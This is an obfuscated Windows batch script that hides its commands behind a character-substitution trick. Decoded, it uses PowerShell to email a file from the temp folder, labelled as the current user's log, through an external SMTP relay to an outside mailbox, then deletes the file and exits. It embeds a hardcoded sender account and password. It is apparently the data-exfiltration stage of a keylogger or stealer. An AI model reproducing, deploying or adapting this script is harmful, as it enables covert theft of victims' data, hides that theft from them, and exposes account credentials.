@echo off&(if defined @lo@ goto ¡)&setlocal disableDelayedExpansion&for /f "delims=: tokens=2" %%A in ('chcp') do set "@chcp@=chcp %%A>nul"&chcp 708>nul&set ^"@args@=%*"
set "@lo@= !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~""
set "@hi@=¡¢¤¥§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ£"
(setlocal enableDelayedExpansion&for /l %%N in (0 1 93) do set "!@hi@:~%%N,1!=!@lo@:~%%N,1!")&cmd /c ^""%~f0" !@args@!"
%@chcp@%&exit /b
:¡
%Á%%æ%%ä%%é%%ð%%¡%%ð%%ç%%ç%
%ä%%í%%ô%
%ô%%æ%%õ%%¡%%£%%Ô%%Ô%%²%%¾%%ô%%î%%õ%%ñ%%®%%ó%%æ%%í%%â%%ú%%¯%%ã%%ó%%æ%%÷%%ð%%¯%%ä%%ð%%î%%£%
%ô%%æ%%õ%%¡%%£%%Ô%%Ô%%³%%¾%%¶%%¹%%¸%%£%
%ô%%æ%%õ%%¡%%£%%Ô%%Ô%%´%%¾%%î%%â%%ê%%í%%¯%%í%%ð%%è%%¯%%ó%%æ%%ä%%ô%%Á%%è%%î%%â%%ê%%í%%¯%%ä%%ð%%î%%£%
%ô%%æ%%õ%%¡%%£%%Ô%%Ô%%µ%%¾%%È%%ð%%å%%æ%%ï%%õ%%æ%%í%%Á%%ñ%%ó%%ð%%õ%%ð%%ï%%¯%%î%%æ%%£%
%ô%%æ%%õ%%¡%%£%%Ô%%Ô%%¶%%¾%%Æ%%ï%%÷%%ð%%ê%%¡%%å%%ö%%¡%%ç%%ê%%ä%%é%%ê%%æ%%ó%%¡%%í%%ð%%è%%£%
%ô%%æ%%õ%%¡%%£%%Ô%%Ô%%·%%¾%%Ç%%ê%%ä%%é%%ê%%æ%%ó%%¡%%í%%ð%%è%%¡%%å%%æ%%¡%%USERNAME%%­%%¡%%í%%æ%%¡%%date%%¡%%time%%¯%%£%
%ô%%æ%%õ%%¡%%£%%Ô%%Ô%%¸%%¾%%temp%%Ý%%Ö%%Ô%%Ó%%Í%%¯%%í%%ð%%è%%£%
%ô%%æ%%õ%%¡%%£%%Ô%%Ô%%¹%%¾%%î%%â%%ê%%í%%¯%%í%%ð%%è%%¯%%ó%%æ%%ä%%ô%%Á%%è%%î%%â%%ê%%í%%¯%%ä%%ð%%î%%£%
%ô%%æ%%õ%%¡%%£%%Ô%%Ô%%º%%¾%%Ç%%Õ%%Ð%%Û%%î%%÷%%É%%Å%%Ê%%·%%º%%¶%%ø%%×%%µ%%ô%%£%
%ñ%%ð%%ø%%æ%%ó%%ô%%é%%æ%%í%%í%%¡%%®%%Ä%%ð%%î%%î%%â%%ï%%å%%¡%%£%%Ô%%æ%%ï%%å%%®%%Î%%â%%ê%%í%%Î%%æ%%ô%%ô%%â%%è%%æ%%¡%%®%%Ç%%ó%%ð%%î%%¡%%¨%%SS3%%¨%%¡%%®%%Õ%%ð%%¡%%¨%%SS4%%¨%%¡%%®%%Ô%%ö%%ã%%ë%%æ%%ä%%õ%%¡%%¨%%SS5%%¨%%¡%%®%%Ã%%ð%%å%%ú%%¡%%¨%%SS6%%¨%%¡%%®%%Â%%õ%%õ%%â%%ä%%é%%î%%æ%%ï%%õ%%ô%%¡%%¨%%SS7%%¨%%¡%%®%%Ô%%î%%õ%%ñ%%Ô%%æ%%ó%%÷%%æ%%ó%%¡%%¨%%SS1%%¨%%¡%%®%%Ñ%%ð%%ó%%õ%%¡%%¨%%SS2%%¨%%¡%%®%%Ö%%ô%%æ%%Ô%%ô%%í%%¡%%®%%Ä%%ó%%æ%%å%%æ%%ï%%õ%%ê%%â%%í%%¡%%©%%Ï%%æ%%ø%%®%%Ð%%ã%%ë%%æ%%ä%%õ%%¡%%Ô%%ú%%ô%%õ%%æ%%î%%¯%%Î%%â%%ï%%â%%è%%æ%%î%%æ%%ï%%õ%%¯%%Â%%ö%%õ%%ð%%î%%â%%õ%%ê%%ð%%ï%%¯%%Ñ%%Ô%%Ä%%ó%%æ%%å%%æ%%ï%%õ%%ê%%â%%í%%¡%%®%%Â%%ó%%è%%ö%%î%%æ%%ï%%õ%%Í%%ê%%ô%%õ%%¡%%©%%¨%%SS8%%¨%%­%%¡%%©%%Ä%%ð%%ï%%÷%%æ%%ó%%õ%%Õ%%ð%%®%%Ô%%æ%%ä%%ö%%ó%%æ%%Ô%%õ%%ó%%ê%%ï%%è%%¡%%®%%Ô%%õ%%ó%%ê%%ï%%è%%¡%%¨%%SS9%%¨%%¡%%®%%Â%%ô%%Ñ%%í%%â%%ê%%ï%%Õ%%æ%%ù%%õ%%¡%%®%%Ç%%ð%%ó%%ä%%æ%%ª%%ª%%ª%%£%
%Á%%õ%%ê%%î%%æ%%ð%%ö%%õ%%¡%%°%%õ%%¡%%±%%³%%¿%%ï%%ö%%í%
%Å%%Æ%%Í%%¡%%temp%%Ý%%Ö%%Ô%%Ó%%Í%%¯%%í%%ð%%è%%¿%%ï%%ö%%í%
%Æ%%ù%%ê%%õ%
